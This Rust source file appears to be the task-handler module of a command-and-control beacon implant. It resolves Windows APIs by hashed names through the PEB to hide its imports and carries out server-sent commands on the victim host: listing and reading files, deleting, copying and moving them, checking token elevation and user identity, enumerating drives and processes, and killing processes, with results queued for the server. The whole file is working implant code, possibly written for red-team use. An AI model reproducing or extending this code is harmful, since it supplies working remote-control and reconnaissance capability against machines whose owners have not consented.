//! Command handlers (port of `src_beacon/src/tasks/`): the file set first
//! (pwd/cd/ls/cat); process, tokens, SOCKS5, forwarding and jobs come with
//! the next iterations. Dispatch is typed and exhaustive: a command the
//! server can send without a matching handler is dropped from the pack
//! (the server keeps it hosted), never misparsed.
//!
//! Every handler resolves its APIs by FNV-64 hash through the instance's
//! kernel32 and writes its result record through the pure builders of
//! `specter_core::transport` — the byte formats live there, pinned by
//! tests against the server source (docs/WIRE.md).
//!
//! Phase 3 of the roadmap (docs/ETUDE-DE-FAISABILITE.md, section 8).

use core::ffi::c_void;

use specter_core::fnv::fnv1a64;
use specter_core::peb;
use specter_core::transport::{self, Task};
use specter_core::wire::Writer;

use crate::runtime::bootstrap::Instance;

const H_GET_CURRENT_DIRECTORY_A: u64 = fnv1a64(b"GetCurrentDirectoryA");
const H_SET_CURRENT_DIRECTORY_A: u64 = fnv1a64(b"SetCurrentDirectoryA");
const H_FIND_FIRST_FILE_A: u64 = fnv1a64(b"FindFirstFileA");
const H_FIND_NEXT_FILE_A: u64 = fnv1a64(b"FindNextFileA");
const H_FIND_CLOSE: u64 = fnv1a64(b"FindClose");
const H_CREATE_FILE_A: u64 = fnv1a64(b"CreateFileA");
const H_READ_FILE: u64 = fnv1a64(b"ReadFile");
const H_CLOSE_HANDLE: u64 = fnv1a64(b"CloseHandle");
const H_GET_LAST_ERROR: u64 = fnv1a64(b"GetLastError");
const H_CREATE_DIRECTORY_A: u64 = fnv1a64(b"CreateDirectoryA");
const H_REMOVE_DIRECTORY_A: u64 = fnv1a64(b"RemoveDirectoryA");
const H_DELETE_FILE_A: u64 = fnv1a64(b"DeleteFileA");
const H_COPY_FILE_A: u64 = fnv1a64(b"CopyFileA");
const H_MOVE_FILE_A: u64 = fnv1a64(b"MoveFileA");
const H_GET_FILE_ATTRIBUTES_A: u64 = fnv1a64(b"GetFileAttributesA");
const H_LOOKUP_ACCOUNT_SID_A: u64 = fnv1a64(b"LookupAccountSidA");
const H_GET_LOGICAL_DRIVES: u64 = fnv1a64(b"GetLogicalDrives");
const H_GET_DRIVE_TYPE_A: u64 = fnv1a64(b"GetDriveTypeA");
const H_CREATE_TOOLHELP32_SNAPSHOT: u64 = fnv1a64(b"CreateToolhelp32Snapshot");
const H_PROCESS32_FIRST_W: u64 = fnv1a64(b"Process32FirstW");
const H_PROCESS32_NEXT_W: u64 = fnv1a64(b"Process32NextW");
const H_PROCESS_ID_TO_SESSION_ID: u64 = fnv1a64(b"ProcessIdToSessionId");
const H_IS_WOW64_PROCESS: u64 = fnv1a64(b"IsWow64Process");
const H_OPEN_PROCESS: u64 = fnv1a64(b"OpenProcess");
const H_TERMINATE_PROCESS: u64 = fnv1a64(b"TerminateProcess");
const H_OPEN_PROCESS_TOKEN: u64 = fnv1a64(b"OpenProcessToken");
const H_GET_TOKEN_INFORMATION: u64 = fnv1a64(b"GetTokenInformation");
const H_ADVAPI32: u64 = specter_core::fnv::fnv1a64_wide_ascii_ci("advapi32.dll");

/// WIN32_FIND_DATAA tail: attributes at +0, ftLastWriteTime at +0x14,
/// size (high:low) at +0x1C/+0x20, cFileName at +0x2C.
const FIND_DATA_SIZE: usize = 0x140;
const FIND_OFF_ATTR: usize = 0;
const FIND_OFF_WRITE_TIME: usize = 0x14;
const FIND_OFF_SIZE_HIGH: usize = 0x1C;
const FIND_OFF_SIZE_LOW: usize = 0x20;
const FIND_OFF_NAME: usize = 0x2C;

const GENERIC_READ: u32 = 0x8000_0000;
const FILE_SHARE_READ: u32 = 0x0000_0001;
const OPEN_EXISTING: u32 = 3;
const FILE_ATTRIBUTE_DIRECTORY: u32 = 0x0000_0010;
/// 1970-01-01 in Windows FILETIME ticks (100 ns).
const FILETIME_UNIX_EPOCH: u64 = 116_444_736_000_000_000;

/// The CAT read cap of the native dialog ("first 2048 bytes").
const CAT_CAP: usize = 2048;
/// LS entry cap: results beyond this are silently truncated (the listing
/// stays bounded on both sides of the wire).
const LS_MAX_ENTRIES: u32 = 128;
const LS_NAME_CAP: usize = 64;

/// Dispatch one task; the result record lands in `results` for the next
/// POST. Failures write a COMMAND_ERROR record, never silence.
///
/// # Safety
///
/// Beacon thread; instance stored in the TEB.
pub unsafe fn handle(instance: &mut Instance, task: Task, id: u32, results: &mut Writer) {
    let kernel32 = instance.kernel32;
    if kernel32.is_null() {
        return; // resolution impossible before bootstrap — nothing to report
    }
    match task {
        Task::Pwd => pwd(kernel32, id, results),
        Task::Cd { .. } => cd(kernel32, &task, id, results),
        Task::Ls { .. } => ls(kernel32, &task, id, results),
        Task::Cat { .. } => cat(kernel32, &task, id, results),
        Task::Mkdir { .. } => mkdir(kernel32, &task, id, results),
        Task::Rm { .. } => rm(kernel32, &task, id, results),
        Task::Cp { .. } => copy_move(kernel32, &task, id, results, true),
        Task::Mv { .. } => copy_move(kernel32, &task, id, results, false),
        Task::Getuid => getuid(kernel32, id, results),
        Task::Disks => disks(kernel32, id, results),
        Task::PsList => ps_list(kernel32, id, results),
        Task::PsKill { pid } => ps_kill(kernel32, pid, id, results),
        Task::Sleep { .. } | Task::Terminate => {}
    }
}

/// Copy raw path bytes into a NUL-terminated API buffer.
fn c_path_bytes(path: &[u8], buf: &mut [u8]) -> Option<usize> {
    if path.len() + 1 > buf.len() {
        return None;
    }
    let mut i = 0;
    while i < path.len() {
        buf[i] = path[i];
        i += 1;
    }
    buf[path.len()] = 0;
    Some(path.len())
}

/// Copy a task's primary path into a NUL-terminated API buffer.
fn c_path(task: &Task, buf: &mut [u8]) -> Option<usize> {
    c_path_bytes(task.path(), buf)
}

unsafe fn pwd(kernel32: *mut c_void, id: u32, results: &mut Writer) {
    let p = peb::find_export(kernel32, H_GET_CURRENT_DIRECTORY_A);
    if p.is_null() {
        return;
    }
    let getcwd = *(p as *const unsafe extern "system" fn(u32, *mut u8) -> u32);
    let mut buf = [0u8; 260];
    let n = getcwd(259, buf.as_mut_ptr());
    if n == 0 || n as usize >= buf.len() {
        error(kernel32, id, results);
        return;
    }
    let _ = transport::push_path_result(results, id, transport::COMMAND_PWD, &buf[..n as usize]);
}

unsafe fn cd(kernel32: *mut c_void, task: &Task, id: u32, results: &mut Writer) {
    let set = peb::find_export(kernel32, H_SET_CURRENT_DIRECTORY_A);
    let get = peb::find_export(kernel32, H_GET_CURRENT_DIRECTORY_A);
    if set.is_null() || get.is_null() {
        return;
    }
    let set = *(set as *const unsafe extern "system" fn(*const u8) -> i32);
    let get = *(get as *const unsafe extern "system" fn(u32, *mut u8) -> u32);
    let mut path = [0u8; 260];
    if c_path(task, &mut path).is_none() {
        error(kernel32, id, results);
        return;
    }
    if set(path.as_ptr()) == 0 {
        error(kernel32, id, results);
        return;
    }
    let mut buf = [0u8; 260];
    let n = get(259, buf.as_mut_ptr());
    if n == 0 || n as usize >= buf.len() {
        error(kernel32, id, results);
        return;
    }
    let _ = transport::push_path_result(results, id, transport::COMMAND_CD, &buf[..n as usize]);
}

unsafe fn cat(kernel32: *mut c_void, task: &Task, id: u32, results: &mut Writer) {
    let create = peb::find_export(kernel32, H_CREATE_FILE_A);
    let read = peb::find_export(kernel32, H_READ_FILE);
    let close = peb::find_export(kernel32, H_CLOSE_HANDLE);
    if create.is_null() || read.is_null() || close.is_null() {
        return;
    }
    let create = *(create
        as *const unsafe extern "system" fn(
            *const u8,
            u32,
            u32,
            *const c_void,
            u32,
            u32,
            *const c_void,
        ) -> isize);
    let read = *(read as *const unsafe extern "system" fn(
        isize,
        *mut u8,
        u32,
        *mut u32,
        *const c_void,
    ) -> i32);
    let close = *(close as *const unsafe extern "system" fn(isize) -> i32);

    let mut path = [0u8; 260];
    if c_path(task, &mut path).is_none() {
        error(kernel32, id, results);
        return;
    }
    let handle = create(
        path.as_ptr(),
        GENERIC_READ,
        FILE_SHARE_READ,
        core::ptr::null(),
        OPEN_EXISTING,
        0,
        core::ptr::null(),
    );
    if handle == -1 {
        error(kernel32, id, results);
        return;
    }
    let mut buf = [0u8; CAT_CAP];
    let mut got: u32 = 0;
    let ok = read(
        handle,
        buf.as_mut_ptr(),
        CAT_CAP as u32,
        &mut got,
        core::ptr::null(),
    );
    close(handle);
    if ok == 0 {
        error(kernel32, id, results);
        return;
    }
    let _ = transport::push_cat_result(results, id, task.path(), &buf[..got as usize]);
}

unsafe fn ls(kernel32: *mut c_void, task: &Task, id: u32, results: &mut Writer) {
    let first = peb::find_export(kernel32, H_FIND_FIRST_FILE_A);
    let next = peb::find_export(kernel32, H_FIND_NEXT_FILE_A);
    let close = peb::find_export(kernel32, H_FIND_CLOSE);
    if first.is_null() || next.is_null() || close.is_null() {
        return;
    }
    let first = *(first as *const unsafe extern "system" fn(*const u8, *mut u8) -> isize);
    let next = *(next as *const unsafe extern "system" fn(isize, *mut u8) -> i32);
    let close = *(close as *const unsafe extern "system" fn(isize) -> i32);

    // Search path: the directory (or pattern) plus `\*` when no wildcard
    // is present — the server strips the suffix for display.
    let mut search = [0u8; 264];
    let path = task.path();
    let root_len = path.len();
    if root_len + 3 > search.len() {
        error(kernel32, id, results);
        return;
    }
    let mut i = 0;
    while i < path.len() {
        search[i] = path[i];
        i += 1;
    }
    if root_len == 0 || search[root_len - 1] != b'*' {
        search[root_len] = b'\\';
        search[root_len + 1] = b'*';
        search[root_len + 2] = 0;
    } else {
        // Pattern given: the raw argument is the search path.
        search[root_len] = 0;
    }

    let mut data = [0u8; FIND_DATA_SIZE];
    let handle = first(search.as_ptr(), data.as_mut_ptr());
    if handle == -1 {
        error(kernel32, id, results);
        return;
    }

    // Entries land in a scratch writer first: the count precedes them.
    let mut scratch = [0u8; 2048];
    let mut sw = Writer::new(&mut scratch);
    let mut count: u32 = 0;
    loop {
        // name: bounded NUL-terminated read
        let mut nlen = 0usize;
        while nlen < LS_NAME_CAP && data[FIND_OFF_NAME + nlen] != 0 {
            nlen += 1;
        }
        let size = ((data[FIND_OFF_SIZE_HIGH] as u64) << 32) | (data[FIND_OFF_SIZE_LOW] as u64);
        let ft = u64::from_le_bytes([
            data[FIND_OFF_WRITE_TIME],
            data[FIND_OFF_WRITE_TIME + 1],
            data[FIND_OFF_WRITE_TIME + 2],
            data[FIND_OFF_WRITE_TIME + 3],
            data[FIND_OFF_WRITE_TIME + 4],
            data[FIND_OFF_WRITE_TIME + 5],
            data[FIND_OFF_WRITE_TIME + 6],
            data[FIND_OFF_WRITE_TIME + 7],
        ]);
        let mut date = 0u64;
        if ft >= FILETIME_UNIX_EPOCH {
            date = (ft - FILETIME_UNIX_EPOCH) / 10_000_000;
        }
        let is_dir = data[FIND_OFF_ATTR] as u32 & FILE_ATTRIBUTE_DIRECTORY != 0;
        if !transport::push_ls_entry(
            &mut sw,
            is_dir,
            size,
            date as u32,
            &data[FIND_OFF_NAME..FIND_OFF_NAME + nlen],
        ) {
            break;
        }
        count += 1;
        if count >= LS_MAX_ENTRIES {
            break;
        }
        if next(handle, data.as_mut_ptr()) == 0 {
            break;
        }
    }
    close(handle);

    // Root for display: the argument without a trailing `\*` suffix.
    let mut root_end = path.len();
    if root_end >= 2 && path[root_end - 1] == b'*' && path[root_end - 2] == b'\\' {
        root_end -= 2;
    }
    let root = &task.path()[..root_end];

    if !transport::push_ls_result_header(results, id, root, count) {
        return;
    }
    // Manual copy of the scratch (memcpy rule).
    let mut i = 0;
    let bytes = sw.written_bytes();
    while i < bytes.len() {
        if !results.push(&[bytes[i]]) {
            return;
        }
        i += 1;
    }
}

unsafe fn mkdir(kernel32: *mut c_void, task: &Task, id: u32, results: &mut Writer) {
    let p = peb::find_export(kernel32, H_CREATE_DIRECTORY_A);
    if p.is_null() {
        return;
    }
    let create = *(p as *const unsafe extern "system" fn(*const u8, *const c_void) -> i32);
    let mut path = [0u8; 260];
    if c_path(task, &mut path).is_none() {
        error(kernel32, id, results);
        return;
    }
    if create(path.as_ptr(), core::ptr::null()) == 0 {
        error(kernel32, id, results);
        return;
    }
    let _ = transport::push_mkdir_result(results, id, task.path());
}

unsafe fn rm(kernel32: *mut c_void, task: &Task, id: u32, results: &mut Writer) {
    let attrs = peb::find_export(kernel32, H_GET_FILE_ATTRIBUTES_A);
    let remove_dir = peb::find_export(kernel32, H_REMOVE_DIRECTORY_A);
    let delete_file = peb::find_export(kernel32, H_DELETE_FILE_A);
    if attrs.is_null() || remove_dir.is_null() || delete_file.is_null() {
        return;
    }
    let attrs = *(attrs as *const unsafe extern "system" fn(*const u8) -> u32);
    let remove_dir = *(remove_dir as *const unsafe extern "system" fn(*const u8) -> i32);
    let delete_file = *(delete_file as *const unsafe extern "system" fn(*const u8) -> i32);
    let mut path = [0u8; 260];
    if c_path(task, &mut path).is_none() {
        error(kernel32, id, results);
        return;
    }
    // INVALID_FILE_ATTRIBUTES is 0xFFFFFFFF; the directory bit 0x10
    // decides between RemoveDirectoryA and DeleteFileA — the result
    // byte tells the server which message to render.
    let attributes = attrs(path.as_ptr());
    let is_dir = attributes != 0xFFFF_FFFF && attributes & FILE_ATTRIBUTE_DIRECTORY != 0;
    let ok = if is_dir {
        remove_dir(path.as_ptr()) != 0
    } else {
        delete_file(path.as_ptr()) != 0
    };
    if !ok {
        error(kernel32, id, results);
        return;
    }
    let _ = transport::push_rm_result(results, id, is_dir);
}

unsafe fn copy_move(
    kernel32: *mut c_void,
    task: &Task,
    id: u32,
    results: &mut Writer,
    is_copy: bool,
) {
    let p = if is_copy {
        peb::find_export(kernel32, H_COPY_FILE_A)
    } else {
        peb::find_export(kernel32, H_MOVE_FILE_A)
    };
    if p.is_null() {
        return;
    }
    let mut src = [0u8; 260];
    let mut dst = [0u8; 260];
    if c_path_bytes(task.path(), &mut src).is_none() {
        error(kernel32, id, results);
        return;
    }
    if c_path_bytes(task.dst(), &mut dst).is_none() {
        error(kernel32, id, results);
        return;
    }
    let ok = if is_copy {
        // bFailIfExists = FALSE: overwrite like the native dialog.
        let copy = *(p as *const unsafe extern "system" fn(*const u8, *const u8, i32) -> i32);
        copy(src.as_ptr(), dst.as_ptr(), 0) != 0
    } else {
        let mv = *(p as *const unsafe extern "system" fn(*const u8, *const u8) -> i32);
        mv(src.as_ptr(), dst.as_ptr()) != 0
    };
    if !ok {
        error(kernel32, id, results);
        return;
    }
    let command = if is_copy {
        transport::COMMAND_COPY
    } else {
        transport::COMMAND_MV
    };
    let _ = transport::push_plain_result(results, id, command);
}

/// Process identity of an open handle: (arch byte, elevated, domain,
/// username) — best effort, every failure degrades to defaults.
/// `arch`: 0 x86-on-x64, 1 x64, 0xFF unknown.
unsafe fn proc_identity(
    kernel32: *mut c_void,
    handle: isize,
) -> (u8, bool, [u8; 32], u16, [u8; 32], u16) {
    let mut domain = [0u8; 32];
    let mut username = [0u8; 32];
    let mut dlen = 0u16;
    let mut ulen = 0u16;
    let mut arch = 0xFFu8;
    let mut elevated = false;

    if !kernel32.is_null() && handle != 0 && handle != -1 {
        let wow = peb::find_export(kernel32, H_IS_WOW64_PROCESS);
        if !wow.is_null() {
            let mut is_wow: i32 = 0;
            let wow = *(wow as *const unsafe extern "system" fn(isize, *mut i32) -> i32);
            if wow(handle, &mut is_wow) != 0 {
                arch = if is_wow != 0 { 0 } else { 1 };
            }
        }
    }

    // Token: elevation + user SID.
    if !kernel32.is_null() {
        // advapi32 is only needed for the token trio; resolve through the
        // PEB the way sysinfo does (advapi32 is in the PEB of any process
        // that resolved GetUserNameA; otherwise the fields stay default).
        let advapi32 =
            specter_core::peb::find_module(crate::runtime::bootstrap::get_peb(), H_ADVAPI32);
        if !advapi32.is_null() {
            let open_token = peb::find_export(advapi32, H_OPEN_PROCESS_TOKEN);
            let get_info = peb::find_export(advapi32, H_GET_TOKEN_INFORMATION);
            let lookup = peb::find_export(advapi32, H_LOOKUP_ACCOUNT_SID_A);
            if !open_token.is_null() && !get_info.is_null() && !lookup.is_null() {
                let open_token = *(open_token
                    as *const unsafe extern "system" fn(isize, u32, *mut isize) -> i32);
                let get_info = *(get_info
                    as *const unsafe extern "system" fn(
                        isize,
                        u32,
                        *mut c_void,
                        u32,
                        *mut u32,
                    ) -> i32);
                let lookup = *(lookup
                    as *const unsafe extern "system" fn(
                        *const c_void,
                        *const c_void,
                        *mut u8,
                        *mut u32,
                        *mut u8,
                        *mut u32,
                        *mut u32,
                    ) -> i32);
                let mut token: isize = 0;
                if open_token(handle, 0x0008, &mut token) != 0 {
                    let mut elev: u32 = 0;
                    let mut ret: u32 = 0;
                    if get_info(token, 20, &mut elev as *mut u32 as *mut c_void, 4, &mut ret) != 0 {
                        elevated = elev != 0;
                    }
                    // TOKEN_USER: a SID pointer at offset 0.
                    let mut sid_buf = [0u8; 64];
                    if get_info(token, 1, sid_buf.as_mut_ptr() as *mut c_void, 64, &mut ret) != 0 {
                        let sid = u64::from_le_bytes([
                            sid_buf[0], sid_buf[1], sid_buf[2], sid_buf[3], sid_buf[4], sid_buf[5],
                            sid_buf[6], sid_buf[7],
                        ]) as *const c_void;
                        if !sid.is_null() {
                            let mut dsize: u32 = 32;
                            let mut usize_: u32 = 32;
                            let mut use_: u32 = 0;
                            if lookup(
                                core::ptr::null(),
                                sid,
                                domain.as_mut_ptr(),
                                &mut dsize,
                                username.as_mut_ptr(),
                                &mut usize_,
                                &mut use_,
                            ) != 0
                            {
                                dlen = dsize as u16;
                                ulen = usize_ as u16;
                            }
                        }
                    }
                    if !kernel32.is_null() {
                        let close = peb::find_export(kernel32, H_CLOSE_HANDLE);
                        if !close.is_null() {
                            (*(close as *const unsafe extern "system" fn(isize) -> i32))(token);
                        }
                    }
                }
            }
        }
    }
    (arch, elevated, domain, dlen, username, ulen)
}

unsafe fn getuid(kernel32: *mut c_void, id: u32, results: &mut Writer) {
    // Current process identity: pseudo-handle -1 covers the token.
    let (arch, elevated, domain, dlen, username, ulen) = proc_identity(kernel32, -1);
    let _ = arch; // getuid reports elevation only (the native format)
    let _ = transport::push_getuid_result(
        results,
        id,
        elevated,
        &domain[..dlen as usize],
        &username[..ulen as usize],
    );
}

unsafe fn disks(kernel32: *mut c_void, id: u32, results: &mut Writer) {
    let drives = peb::find_export(kernel32, H_GET_LOGICAL_DRIVES);
    let dtype = peb::find_export(kernel32, H_GET_DRIVE_TYPE_A);
    if drives.is_null() || dtype.is_null() {
        return;
    }
    let drives = *(drives as *const unsafe extern "system" fn() -> u32);
    let dtype = *(dtype as *const unsafe extern "system" fn(*const u8) -> u32);
    let mask = drives();
    if mask == 0 {
        error(kernel32, id, results);
        return;
    }
    let mut roots = [b'A'; 26];
    let mut count = 0usize;
    let mut i = 0u32;
    while i < 26 {
        if mask & (1u32 << i) != 0 {
            roots[count] = b'A' + i as u8;
            count += 1;
        }
        i += 1;
    }
    if !transport::push_disks_header(results, id, count as u32) {
        return;
    }
    let mut e = 0usize;
    while e < count {
        let letter = roots[e];
        let mut path = [0u8; 4];
        path[0] = letter;
        path[1] = b':';
        path[2] = b'\\';
        let drive_type = dtype(path.as_ptr());
        if !transport::push_disks_entry(results, letter, drive_type) {
            return;
        }
        e += 1;
    }
}

/// PROCESSENTRY32W offsets (x64): dwSize +0, pid +8, ppid +0x20,
/// szExeFile (wide) +0x30 — struct size 0x238.
const PE32W_SIZE: usize = 0x238;
const PE32W_OFF_PID: usize = 0x08;
const PE32W_OFF_PPID: usize = 0x20;
const PE32W_OFF_NAME: usize = 0x30;
const PE32W_NAME_WCAP: usize = 64;
const PS_MAX_ENTRIES: u32 = 256;

unsafe fn ps_list(kernel32: *mut c_void, id: u32, results: &mut Writer) {
    let snap = peb::find_export(kernel32, H_CREATE_TOOLHELP32_SNAPSHOT);
    let first = peb::find_export(kernel32, H_PROCESS32_FIRST_W);
    let next = peb::find_export(kernel32, H_PROCESS32_NEXT_W);
    let session = peb::find_export(kernel32, H_PROCESS_ID_TO_SESSION_ID);
    let open = peb::find_export(kernel32, H_OPEN_PROCESS);
    if snap.is_null() || first.is_null() || next.is_null() || session.is_null() || open.is_null() {
        return;
    }
    let snap = *(snap as *const unsafe extern "system" fn(u32, u32) -> isize);
    let first = *(first as *const unsafe extern "system" fn(isize, *mut u8) -> i32);
    let next = *(next as *const unsafe extern "system" fn(isize, *mut u8) -> i32);
    let session = *(session as *const unsafe extern "system" fn(u32, *mut u32) -> i32);
    let open = *(open as *const unsafe extern "system" fn(u32, i32, u32) -> isize);

    let handle = snap(0x2, 0); // TH32CS_SNAPPROCESS
    if handle == -1 {
        error(kernel32, id, results);
        return;
    }

    let mut entry = [0u8; PE32W_SIZE];
    entry[0] = PE32W_SIZE as u8;
    entry[1] = (PE32W_SIZE >> 8) as u8;

    // Entries land in a scratch writer first: the count precedes them.
    let mut scratch = [0u8; 4096];
    let mut sw = Writer::new(&mut scratch);
    let mut count: u32 = 0;
    let mut ok = first(handle, entry.as_mut_ptr()) != 0;
    while ok && count < PS_MAX_ENTRIES {
        let pid = u32::from_le_bytes([
            entry[PE32W_OFF_PID],
            entry[PE32W_OFF_PID + 1],
            entry[PE32W_OFF_PID + 2],
            entry[PE32W_OFF_PID + 3],
        ]);
        let ppid = u32::from_le_bytes([
            entry[PE32W_OFF_PPID],
            entry[PE32W_OFF_PPID + 1],
            entry[PE32W_OFF_PPID + 2],
            entry[PE32W_OFF_PPID + 3],
        ]);
        let mut sess = 0u32;
        let _ = session(pid, &mut sess);

        // Name: wide -> ACP bytes, bounded.
        let mut nlen = 0usize;
        while nlen < PE32W_NAME_WCAP && entry[PE32W_OFF_NAME + nlen * 2] != 0 {
            nlen += 1;
        }
        let mut name = [0u8; 64];
        let mut i = 0usize;
        while i < nlen {
            name[i] = if entry[PE32W_OFF_NAME + i * 2] < 0x80 {
                entry[PE32W_OFF_NAME + i * 2]
            } else {
                b'?'
            };
            i += 1;
        }

        // Best-effort identity (PROCESS_QUERY_LIMITED_INFORMATION).
        let ph = open(0x1000, 0, pid);
        let (arch, elevated, domain, dlen, username, ulen) = proc_identity(kernel32, ph);
        if ph != 0 {
            let close = peb::find_export(kernel32, H_CLOSE_HANDLE);
            if !close.is_null() {
                (*(close as *const unsafe extern "system" fn(isize) -> i32))(ph);
            }
        }

        let proc = transport::PsEntry {
            pid,
            ppid,
            session: sess,
            arch,
            elevated,
            domain: &domain[..dlen as usize],
            username: &username[..ulen as usize],
            name: &name[..nlen],
        };
        if !transport::push_ps_entry(&mut sw, &proc) {
            break;
        }
        count += 1;
        ok = next(handle, entry.as_mut_ptr()) != 0;
    }
    let close = peb::find_export(kernel32, H_CLOSE_HANDLE);
    if !close.is_null() {
        (*(close as *const unsafe extern "system" fn(isize) -> i32))(handle);
    }

    if count == 0 {
        error(kernel32, id, results);
        return;
    }
    if !transport::push_ps_list_header(results, id, count) {
        return;
    }
    let bytes = sw.written_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if !results.push(&[bytes[i]]) {
            return;
        }
        i += 1;
    }
}

unsafe fn ps_kill(kernel32: *mut c_void, pid: u32, id: u32, results: &mut Writer) {
    let open = peb::find_export(kernel32, H_OPEN_PROCESS);
    let term = peb::find_export(kernel32, H_TERMINATE_PROCESS);
    if open.is_null() || term.is_null() {
        return;
    }
    let open = *(open as *const unsafe extern "system" fn(u32, i32, u32) -> isize);
    let term = *(term as *const unsafe extern "system" fn(isize, u32) -> i32);
    // PROCESS_TERMINATE.
    let handle = open(0x0001, 0, pid);
    if handle == -1 {
        error(kernel32, id, results);
        return;
    }
    let ok = term(handle, 1);
    let close = peb::find_export(kernel32, H_CLOSE_HANDLE);
    if !close.is_null() {
        (*(close as *const unsafe extern "system" fn(isize) -> i32))(handle);
    }
    if ok == 0 {
        error(kernel32, id, results);
        return;
    }
    let _ = transport::push_ps_kill_result(results, id, pid);
}

unsafe fn error(kernel32: *mut c_void, id: u32, results: &mut Writer) {
    let p = peb::find_export(kernel32, H_GET_LAST_ERROR);
    let code = if p.is_null() {
        0
    } else {
        (*(p as *const unsafe extern "system" fn() -> u32))()
    };
    let _ = transport::push_error_result(results, id, code);
}
